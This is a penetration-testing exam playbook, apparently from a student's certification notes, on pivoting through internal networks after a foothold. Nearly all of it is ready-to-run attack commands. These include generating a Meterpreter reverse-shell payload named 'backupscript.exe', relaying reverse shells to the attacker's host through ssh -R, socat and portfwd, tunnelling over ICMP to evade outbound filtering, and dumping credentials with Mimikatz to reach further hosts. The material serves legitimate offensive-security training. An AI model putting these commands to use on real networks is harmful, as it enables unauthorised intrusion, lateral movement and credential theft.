# NOTE — Pivoting, Tunneling & Port Forwarding Methodology (Exam Playbook)

## ID
705

## Module
Pivoting, Tunneling, and Port Forwarding

## Kind
methodology

## Title
Pivoting, Tunneling & Port Forwarding — Full Pentest Methodology

## Description
End-to-end exam playbook for moving through internal networks after popping a foothold: identify dual-homed hosts → pick a tunneling technique by what you have (SSH / Meterpreter / shell / blocked outbound) → set up SOCKS or single-port forward → chain hops. Decision-tree first; commands drawn from this vault's own notes.

## Tags
methodology, pivoting, tunneling, port-forwarding, socks, proxychains, ssh, meterpreter, socat, plink, sshuttle, rpivot, icmp-tunneling, ptunnel, dual-homed, dynamic-forward, local-forward, remote-forward, reverse-shell, multi-hop, internal-network, no-route, can-not-reach-internal, firewall-blocks-outbound, stuck, now-what, exam, cheatsheet, decision-tree

---

## TL;DR — The 6-Phase Pivoting Flow

1. **Land on host** — `ifconfig` / `ipconfig /all`. Extra NIC = dual-homed = pivot opportunity.
2. **Map the new network FROM the pivot** — ICMP sweep from inside (NOT through proxychains — too slow).
3. **Choose tunneling method by access** — SSH key/creds? Meterpreter? plain shell? outbound blocked?
4. **Establish the tunnel** — SOCKS proxy (default), single-port forward, or reverse forward (catch shells).
5. **Use the tunnel** — `proxychains <tool>` (Linux) / Proxifier (Windows) / `sshuttle` for transparent.
6. **Repeat per hop** — every new pivot may have ANOTHER hidden subnet. Always `ipconfig /all` again.

> **Golden rule:** every newly compromised host gets `ifconfig` / `ipconfig /all` BEFORE anything else. Dual-homed hosts are the entire point of this module — miss it and you'll waste an hour wondering "now what?"

> **OPSEC fork:** ICMP sweeps and quick recon belong ON the pivot (native speed). Only proxy the targeted scans/exploits through SOCKS — proxychains on `/24` sweeps will burn 20 minutes.

> **Cross-link:** the SOCKS proxy you set up here is what AD Phase 6 — Lateral Movement uses. See [[../ad-enum-attacks/00-METHODOLOGY]].

---

## Phase 1 — Map the Compromised Host (find pivot opportunities)

**Goal:** confirm whether this host can reach networks your attack box cannot.

| Check | Linux | Windows |
|---|---|---|
| All NICs + IPs | `ifconfig` / `ip a` | `ipconfig /all` |
| Routing table | `ip route` / `route -n` | `route print` / `netstat -rn` |
| ARP cache (other hosts on link) | `arp -a` / `ip neigh` | `arp -a` |
| Existing connections (find adjacent hosts) | `netstat -antp` / `ss -antp` | `netstat -antp` |
| DNS resolvers (hint internal domain) | `cat /etc/resolv.conf` | `ipconfig /all` (DNS Servers) |

**Output checkpoint:** you have a list of subnets the pivot can reach that your attack host cannot. If only one subnet (your own), this host is not a pivot — move on.

---

## Phase 2 — Sweep the Internal Subnet (from the pivot)

**Goal:** identify live internal hosts before deciding what to forward.

```bash
# Linux pivot — ICMP sweep
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done; wait

# Windows pivot — CMD (not PowerShell)
for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.5.%i | find "Reply"
```

**Output checkpoint:** list of live IPs. Note the pivot's own internal IP — you'll need it as `LHOST` for reverse-shell payloads later.

> **Pitfall:** running this sweep THROUGH proxychains is painfully slow. Always sweep from inside the pivot. Use proxychains only for the targeted scan once you have IPs.

---

## Phase 3 — Choose Tunneling Method by What You Have

| You have on the pivot | Pivot OS | Best tool | Notes |
|---|---|---|---|
| SSH creds / key, want everything tunneled | Linux | `ssh -D 9050` + proxychains | [[05-ssh-port-forwarding]] |
| SSH on pivot, want NO proxychains prefix | Linux | `sshuttle` | TCP only, needs sudo. [[10-sshuttle]] |
| SSH on pivot, one port from one host | Linux | `ssh -L LPORT:TARGET:RPORT` | [[05-ssh-port-forwarding]] |
| SSH on pivot, catch reverse shell from internal | Linux | `ssh -R PIVOT_IP:LPORT:0.0.0.0:APORT` | [[05-ssh-port-forwarding]] |
| Attack host is Windows, SSH client needed | (any) | `plink -ssh -D / -L` + Proxifier | [[09-plink-windows]] |
| Meterpreter shell, no SSH | Win/Lin | `autoroute` + `socks_proxy` / `portfwd` | [[06-meterpreter-port-forwarding]] |
| Plain shell, no SSH, no MSF, pivot is Linux | Linux | `socat TCP4-LISTEN,fork TCP4:` | [[07-socat-redirection]] |
| Outbound TCP blocked on pivot, ICMP allowed | Linux | `ptunnel-ng` | Last resort, slow. [[13-ptunnel-icmp]] |
| Pivot can dial out to me but I can't reach it inbound | Linux | `rpivot` (reverse SOCKS) | Python 2.7 required. [[11-rpivot]] |

---

## Phase 4 — Establish the Tunnel (per-technique)

### 4a. SSH Dynamic Forward (default — most flexible)

**Trigger/Precondition:** SSH credentials or key on the pivot; pivot reachable on TCP/22.

```bash
ssh -D 9050 $USER@$PIVOT_IP                              # Linux attack
plink -ssh -D 9050 $USER@$PIVOT_IP -pw "$PASS"           # Windows attack
echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf
```

**Output checkpoint:** `ss -tlnp | grep 9050` shows ssh listening; `proxychains curl http://$INTERNAL_TARGET` returns content.

### 4b. SSH Local Forward (single port)

**Trigger/Precondition:** you only need ONE service (e.g. RDP on one host) and want it on `localhost:$LPORT`.

```bash
ssh -L $LPORT:$INTERNAL_TARGET:$RPORT $USER@$PIVOT_IP
# e.g. ssh -L 3389:172.16.5.19:3389 ubuntu@10.129.x.x
# Then: xfreerdp /v:127.0.0.1:$LPORT /u:$USER /p:"$PASS"
```

### 4c. SSH Remote Forward (catch reverse shell from internal target)

**Trigger/Precondition:** internal target cannot reach your `tun0` but CAN reach the pivot.

```bash
# 1. Listener on attack host
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set lhost 0.0.0.0; set lport $APORT; run"
# 2. Payload — LHOST = pivot's INTERNAL IP, LPORT = port pivot will listen on
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=$PIVOT_INTERNAL_IP LPORT=$PIVOT_LPORT \
  -f exe -o backupscript.exe
# 3. Reverse tunnel — shell hits pivot:$PIVOT_LPORT, gets forwarded to attack:$APORT
ssh -R $PIVOT_IP:$PIVOT_LPORT:0.0.0.0:$APORT $USER@$PIVOT_IP -vN
# 4. Deliver and execute payload on target
```

### 4d. sshuttle (transparent VPN — no proxychains prefix)

**Trigger/Precondition:** SSH on pivot + you have sudo on the attack host + you want native tool behavior.

```bash
sudo apt-get install sshuttle
sudo sshuttle -r $USER@$PIVOT_IP 172.16.5.0/23 -v
# Optional DNS:
sudo sshuttle --dns -r $USER@$PIVOT_IP 172.16.5.0/23 -v
# Now run tools natively (still TCP only):
sudo nmap -v -A -sT -p3389 $INTERNAL_TARGET -Pn
xfreerdp /v:$INTERNAL_TARGET /u:$USER /p:"$PASS" /cert:ignore
```

### 4e. Meterpreter Autoroute + SOCKS

**Trigger/Precondition:** Meterpreter session on pivot, no SSH access.

```text
meterpreter> run autoroute -s 172.16.5.0/23

msf6> use auxiliary/server/socks_proxy
msf6> set version 4a
msf6> run
# Default SOCKS on 127.0.0.1:1080 → edit /etc/proxychains4.conf accordingly
```

### 4f. Meterpreter portfwd (single port / reverse)

```text
# Local — bring internal target's RDP to attack-host localhost:3300
meterpreter> portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Reverse — catch internal shell, forward to your handler
meterpreter> portfwd add -R -l $PIVOT_LPORT -p $APORT -L $ATTACK_IP
```

### 4g. socat redirection (no SSH, no MSF)

**Trigger/Precondition:** plain shell on a Linux pivot with `socat` available.

```bash
# On pivot — listen, fork, forward
socat TCP4-LISTEN:$PIVOT_LPORT,fork TCP4:$ATTACK_IP:$APORT
# Payload LHOST = pivot IP, LPORT = $PIVOT_LPORT
# Handler on attack host listens on $APORT
```

### 4h. plink (Windows attack host)

**Trigger/Precondition:** attack host is Windows (CPTS exam allows this).

```cmd
plink -ssh -D 9050 ubuntu@10.129.x.x -pw "$PASS"
plink -ssh -L 33389:172.16.5.19:3389 ubuntu@10.129.x.x -pw "$PASS"
# Configure Proxifier: 127.0.0.1:9050 SOCKS4 → launch mstsc /v:172.16.5.19
```

### 4i. ptunnel-ng (ICMP tunnel)

**Trigger/Precondition:** outbound TCP filtered, ICMP echo allowed end-to-end. Last resort.

```bash
# Attack host
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng && ./autogen.sh
scp -r ~/ptunnel-ng $USER@$PIVOT_IP:~/

# Pivot — bypass autoreconf if libcrypto mismatch
cd ~/ptunnel-ng
touch aclocal.m4 configure Makefile.in src/Makefile.in src/config.h.in
make -C src
sudo ./ptunnel-ng -r$PIVOT_IP -R22

# Attack — second terminal
sudo ./ptunnel-ng -p$PIVOT_IP -l2222 -r$PIVOT_IP -R22

# Third terminal — SSH over the ICMP tunnel + SOCKS
ssh -D 9050 -p 2222 -l $USER 127.0.0.1
proxychains nmap -sT -Pn -p 3389 $INTERNAL_TARGET
```

### 4j. rpivot (reverse SOCKS — pivot dials out)

**Trigger/Precondition:** pivot CAN reach your attack host outbound, but you CANNOT reach the pivot inbound. Pivot has `python2.7`.

```bash
# Attack host
git clone https://github.com/klsecservices/rpivot.git
scp -r rpivot $USER@$PIVOT_IP:/home/$USER/
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Pivot host (SSH session)
cd ~/rpivot
python2.7 client.py --server-ip $ATTACK_TUN0_IP --server-port 9999

# Attack host — usage
pkill firefox-esr
proxychains firefox-esr http://$INTERNAL_WEB
proxychains curl http://$INTERNAL_WEB
```

---

## Phase 5 — Use the Tunnel

| You want | Linux (proxychains) | Windows (Proxifier) | Sshuttle (native) |
|---|---|---|---|
| Scan internal target | `proxychains nmap -sT -Pn $TGT` | (use scanner in Proxifier-routed app) | `sudo nmap -sT $TGT` |
| RDP internal | `proxychains xfreerdp /v:$TGT /u:$U /p:"$P" /cert:ignore` | `mstsc /v:$TGT` | `xfreerdp /v:$TGT ...` |
| SMB | `proxychains smbclient \\\\$TGT\\C$ -U $U%'$P'` | smbclient via WSL or `smbeagle` | direct |
| Web browse | `proxychains firefox-esr http://$TGT` | configure browser SOCKS | direct |
| Run impacket | `proxychains secretsdump.py $U:'$P'@$TGT` | direct via Proxifier | direct |

---

## Phase 6 — Multi-Hop Chaining

After landing on the first internal host, **immediately** repeat Phase 1: `ipconfig /all` / `ifconfig`. Look for a second hidden subnet. The skills assessment ([[skills-assessment]]) is exactly this: web shell → pivot-srv01 (dual-homed: 172.16.5.0/24 + 172.16.6.0/24) → workstation → DC.

Chain pattern:
```
attack-host (tun0)
  └── ssh -D 9050 → pivot1 (172.16.5.0/24)
        └── proxychains xfreerdp → pivot2 [Windows, dual-homed]
              └── mstsc /v: → workstation (172.16.6.0/24)
                    └── enumerate shares → DC
```

When pivot2 is Windows, dump creds with Mimikatz (`privilege::debug` → `sekurlsa::logonpasswords`, **run as admin**) — that often gives you the domain account that owns the next subnet.

---

## Decision Tree (Under Exam Pressure)

```
LANDED ON A HOST — IS IT A PIVOT?
├── ifconfig / ipconfig /all
│   ├── Only one subnet (your own) → NOT a pivot, find another foothold
│   └── Multiple subnets / NICs → CONTINUE ↓
│
ICMP SWEEP THE NEW SUBNET FROM THIS HOST
├── ping loop (bash for / cmd for /L) → list live IPs
└── STUCK > 5 min → ICMP may be blocked. Try TCP connect to common ports.

PICK YOUR TUNNELING TECHNIQUE
├── SSH key/creds on pivot?
│   ├── Yes — want all-traffic → ssh -D 9050 + proxychains (4a)
│   ├── Yes — want native tools → sshuttle (4d)
│   ├── Yes — single port → ssh -L (4b)
│   ├── Yes — catch reverse shell → ssh -R (4c)
│   └── Yes — attack host is Windows → plink (4h)
├── Meterpreter on pivot, no SSH?
│   ├── Many targets / scans → autoroute + socks_proxy (4e)
│   └── One port → portfwd add (4f)
├── Plain shell, no SSH, no MSF?
│   ├── socat installed on pivot → socat redirector (4g)
│   └── socat missing → upload static binary, OR pivot to meterpreter via msfvenom
├── Outbound TCP filtered from pivot?
│   ├── ICMP allowed → ptunnel-ng (4i)
│   ├── Pivot can dial out → rpivot reverse SOCKS (4j)
│   └── Everything blocked → tunnel through approved app proto (DNS / HTTP) — not in vault
└── STUCK > 30 min on tunnel choice → fall back to (4a) ssh -D and brute through

USING THE TUNNEL — INTERNAL TARGET NOT RESPONDING?
├── nmap returns nothing through proxychains
│   └── Switch -sS → -sT -Pn. SOCKS is TCP-only.
├── RDP hangs
│   └── Add /cert:ignore. Use TCP-only options.
├── ICMP sweep showed host but TCP scan fails
│   └── Host-based firewall on internal — try other ports
└── STUCK > 15 min → drop back to pivot, re-run ifconfig — maybe you missed a subnet

NEXT HOP — DON'T STOP AT FIRST PIVOT
├── Just landed on pivot2 → run ipconfig /all AGAIN
├── New subnet appears → repeat Phase 2 sweep from pivot2
└── STUCK → mimikatz on pivot2 (run as admin) for cached creds → reuse on hop 3
```

---

## Signal → Counter-Move Reference

| Symptom you observe | Likely cause | Exact fix |
|---|---|---|
| `proxychains nmap` returns 0 open ports on a host you know is up | Using `-sS` (SYN scan) over SOCKS | `proxychains nmap -sT -Pn $TARGET` — SOCKS is TCP-only |
| `proxychains <tool>` is glacially slow on whole subnets | Every probe routed through SOCKS | Sweep FROM the pivot natively, only proxy the targeted scans |
| Reverse shell never connects to my listener | Handler started AFTER payload fired | Always: handler FIRST, then trigger payload |
| Reverse shell never connects, listener was up | Wrong `LHOST` in payload | `LHOST` = IP the target can reach (usually pivot's internal IP, not your tun0) |
| `ssh -R` shell arrives nowhere | Handler bound to `127.0.0.1` not `0.0.0.0` | `set lhost 0.0.0.0` in handler, use `0.0.0.0:$APORT` in `-R` |
| `sshuttle` errors with iptables | Not running as sudo | `sudo sshuttle -r ...` — needs root for iptables NAT |
| `autoroute` says target unreachable | Wrong netmask format | CIDR only: `172.16.5.0/23` not `172.16.5.0/255.255.254.0` |
| Mimikatz returns access denied / 0x5 | Not elevated | Right-click → Run as administrator. Then `privilege::debug` MUST succeed first |
| xfreerdp through tunnel hangs forever | Cert prompt or UDP transport | Add `/cert:ignore`. xfreerdp uses TCP by default — fine for SOCKS |
| `ptunnel-ng` build fails on pivot (autoreconf / libcrypto) | autotools version mismatch | `touch aclocal.m4 configure Makefile.in src/Makefile.in src/config.h.in && make -C src` |
| Firefox ignores proxychains | Existing Firefox instance reused socket | `pkill firefox-esr` first, then `proxychains firefox-esr` |
| Stuck after popping a host — no idea what to do | Didn't check for second NIC | `ipconfig /all` / `ifconfig` — look for ANOTHER subnet you missed |
| Internal target unreachable, my tun0 is the LHOST | Target has no route to your tun0 | Use pivot as relay (socat / `ssh -R` / `portfwd -R`) with pivot's internal IP as LHOST |
| `plink -D` runs but RDP won't tunnel | Proxifier not configured | Add `127.0.0.1:9050 SOCKS4` profile, then launch mstsc |
| Meterpreter SOCKS proxy gives wrong version errors | Default is SOCKS4a, tool wants SOCKS5 | `set version 5` in `socks_proxy` module |
| rpivot client fails to start | Pivot lacks `python2.7` | Install python2.7 or fall back to ssh -R / socat |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === I have SSH on pivot, want SOCKS for everything ===
ssh -D 9050 $USER@$PIVOT_IP &                                                 # Linux attack
plink -ssh -D 9050 $USER@$PIVOT_IP -pw "$PASS"                                # Windows attack
echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf
proxychains nmap -sT -Pn -p- $INTERNAL_TARGET
proxychains xfreerdp /v:$INTERNAL_TARGET /u:$USER /p:"$PASS" /cert:ignore
proxychains smbclient \\\\$INTERNAL_TARGET\\C\$ -U $USER%"$PASS"

# === Want native tools (no proxychains prefix) ===
sudo sshuttle -r $USER@$PIVOT_IP 172.16.5.0/23 -v
sudo nmap -v -sT -A $INTERNAL_TARGET

# === Single port forward (just need RDP) ===
ssh -L 3389:$INTERNAL_TARGET:3389 $USER@$PIVOT_IP
# → xfreerdp /v:127.0.0.1:3389 /u:$USER /p:"$PASS"

# === Catch reverse shell from internal target (target can't reach me) ===
# attack:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 0.0.0.0; set lport $APORT; run"
# payload (LHOST = pivot's internal IP):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$PIVOT_INT_IP LPORT=$PIVOT_LPORT -f exe -o backupscript.exe
# pick ONE relay:
ssh -R $PIVOT_IP:$PIVOT_LPORT:0.0.0.0:$APORT $USER@$PIVOT_IP -vN              # SSH
socat TCP4-LISTEN:$PIVOT_LPORT,fork TCP4:$ATTACK_IP:$APORT                    # socat

# === Meterpreter pivot, no SSH ===
run autoroute -s 172.16.5.0/23
# msfconsole:
use auxiliary/server/socks_proxy
set version 4a
run
# OR
portfwd add -l 3300 -p 3389 -r $INTERNAL_TARGET
portfwd add -R -l $PIVOT_LPORT -p $APORT -L $ATTACK_IP

# === Outbound TCP blocked, ICMP works ===
sudo ./ptunnel-ng -p$PIVOT_IP -l2222 -r$PIVOT_IP -R22                         # attack client
ssh -D 9050 -p 2222 -l $USER 127.0.0.1                                        # SSH+SOCKS over ICMP

# === Pivot can reach me but I can't reach it inbound ===
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0  # attack
python2.7 client.py --server-ip $ATTACK_TUN0 --server-port 9999               # pivot

# === Sweep from pivot (do this BEFORE proxychains scans) ===
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done; wait        # Linux
for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.5.%i | find "Reply"                 # cmd

# === On Windows pivot — dump creds for next hop ===
# Run mimikatz.exe AS ADMINISTRATOR
privilege::debug
sekurlsa::logonpasswords
```

---

## Quick Reference — Tools by Function

| Function | Linux pivot | Windows pivot | Attack host (Win) | Notes |
|---|---|---|---|---|
| SOCKS proxy | `ssh -D 9050` | `plink -ssh -D 9050` | Proxifier client | proxychains for Linux |
| Single port forward | `ssh -L` | `plink -ssh -L` / `netsh portproxy` | mstsc/127.0.0.1 | binds to localhost by default |
| Reverse shell catcher | `ssh -R` / `socat fork` | `plink -ssh -R` | — | LHOST = pivot's internal IP |
| Transparent VPN | `sshuttle -r` | — | — | TCP only, needs sudo |
| Meterpreter SOCKS | `auxiliary/server/socks_proxy` | same | — | pair with `autoroute` |
| Meterpreter port forward | `portfwd add [-R]` | same | — | `-R` for reverse |
| ICMP tunnel | `ptunnel-ng` | — | — | last resort, slow |
| Reverse SOCKS | `rpivot` (py2.7) | — | — | when pivot can't accept inbound |

---

## Top Gotchas (Things That Will Burn You)

1. **`ifconfig` / `ipconfig /all` on EVERY new host.** Dual-homed = pivot. This is the #1 thing students forget after popping the first box.
2. **`-sT -Pn` for nmap over SOCKS.** SYN (`-sS`) and UDP scans need raw sockets — SOCKS won't carry them. You'll see all-closed results and think the host is dead.
3. **Listener BEFORE payload, always.** Start the handler FIRST. A payload firing into nothing = silent failure.
4. **`LHOST` is the IP the target can REACH** — usually the pivot's internal IP, not your `tun0`. Wrong LHOST = no callback, no error.
5. **SSH keys need `chmod 600`.** Too-permissive perms = SSH silently rejects the key.
6. **`autoroute` wants CIDR, not netmask.** `172.16.5.0/23` works, `172.16.5.0/255.255.254.0` fails. `netstat -r` shows netmask — convert before feeding to autoroute.
7. **proxychains is slow for sweeps.** Sweep FROM the pivot (native ping loop), then run targeted scans through proxychains.
8. **`pkill firefox-esr` before `proxychains firefox-esr`.** A running Firefox reuses an existing socket and ignores proxychains.
9. **`xfreerdp` needs `/cert:ignore`** through tunnels — otherwise it hangs on the cert prompt.
10. **`ptunnel-ng` build often fails on the pivot.** Fix: `touch aclocal.m4 configure Makefile.in src/Makefile.in src/config.h.in && make -C src` to bypass autoreconf.
11. **Mimikatz needs admin.** Right-click → Run as administrator. `privilege::debug` MUST return `'20' OK` before `sekurlsa::logonpasswords`. Use `::` (double colon).
12. **rpivot is Python 2.7.** Confirm `python2.7` is on the pivot before relying on this. If not, fall back to `ssh -R` or `socat`.
13. **Meterpreter SOCKS defaults to SOCKS4a.** Some modern tools want SOCKS5 — `set version 5` in the module.
14. **`for /L` is CMD, not PowerShell.** If you get syntax errors on a Windows sweep, type `cmd` first to drop to cmd.exe.
15. **File transfers across hop boundaries** — when a deep-internal target can't fetch from your tun0, use the pivot as an HTTP relay (`python3 -m http.server 8080` on pivot, target downloads from pivot IP).
16. **SSH tunnels die with the terminal.** Use `tmux` / `screen` or `-fN` to background, otherwise you'll lose the tunnel mid-exploit.
17. **Don't stop at the first pivot.** Re-recon every new host. The skills assessment hides the final DC behind a second pivot you only find via `ipconfig /all`.

---

## Related Vault Notes

- [[01-intro]] — module overview
- [[02-networking-basics]] — NICs, routing, dual-homed concept
- [[05-ssh-port-forwarding]] — `-L` / `-D` / `-R` reference
- [[06-meterpreter-port-forwarding]] — autoroute / socks_proxy / portfwd
- [[07-socat-redirection]] — TCP relay through pivot
- [[09-plink-windows]] — SSH client on Windows + Proxifier
- [[10-sshuttle]] — transparent VPN over SSH
- [[11-rpivot]] — reverse SOCKS proxy
- [[13-ptunnel-icmp]] — ICMP tunneling, last resort
- [[17-detection-prevention]] — defender side (useful for the report phase)
- [[skills-assessment]] — full multi-hop walkthrough (web shell → DC)

Cross-module:
- AD lateral movement uses the SOCKS proxy built here → [[../ad-enum-attacks/00-METHODOLOGY]] Phase 6.
- Common-services attacks (SMB / RDP / MSSQL) are commonly run THROUGH the tunnel set up here → [[../common-services/]].

Triage by symptom: [[../ATTACK-PATHS]] §4 (pivoting / lateral movement).
